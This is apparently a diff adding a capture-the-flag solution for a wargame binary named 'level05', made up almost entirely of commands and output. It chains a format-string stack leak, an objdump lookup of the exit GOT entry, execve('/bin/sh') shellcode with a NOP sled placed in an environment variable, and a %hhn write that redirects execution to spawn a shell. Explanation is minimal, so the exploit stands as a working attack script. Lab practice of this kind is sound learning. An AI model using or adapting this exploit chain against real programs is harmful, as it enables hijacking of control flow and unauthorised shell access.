@@ -1,0 +1,33 @@
+python -c "print('AAAABBBBCCCCDDDD' + ' %p' * 90)" > /tmp/sol5a
+
+cat /tmp/sol5a | ./level05
+    aaaabbbbccccdddd 0x64 0xf7fcfac0 0xf7ec3add 0xffffd6df 0xffffd6de (nil) 0xffffffff 0xffffd764 0xf7fdb000 0x61616161 0x62626262 0x63636363 0x64646464 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
+
+
+ objdump -d -Mintel level05
+    08048370 <exit@plt>:
+     8048370:       ff 25 e0 97 04 08       jmp    DWORD PTR ds:0x80497e0
+
+
+python -c "print(40 * '\x90' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')" > /tmp/sol5b
+
+export SHELLCODE="$(cat /tmp/sol5b)"
+gdb level05
+    :start
+    :x/500s $esp
+        0xffffd898:      "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343P\211\342S\211\341\260\v̀"
+
+0xffffd898 + 40 = 0xFFFFD8C0
+
+python -c "print('\xc0\xd8\xff\xff' + '%10\$s')" > /tmp/sol5a
+    �����������������������������1�Ph//shh/bin��P��S��
+
+"""
+C0 = 16 + 176
+D8 = 24 + 192
+FF = 39 + 216
+"""
+
+python -c "print('\xe0\x97\x04\x08' + '\xe1\x97\x04\x08' + '\xe2\x97\x04\x08' + '\xe3\x97\x04\x08' + '%176x' + '%10\$hhn' + '%24x' + '%11\$hhn' + '%39x' + '%12\$hhn' + '%13\$hhn')" > /tmp/sol5a
+
+cat /tmp/sol5a - | ./level05
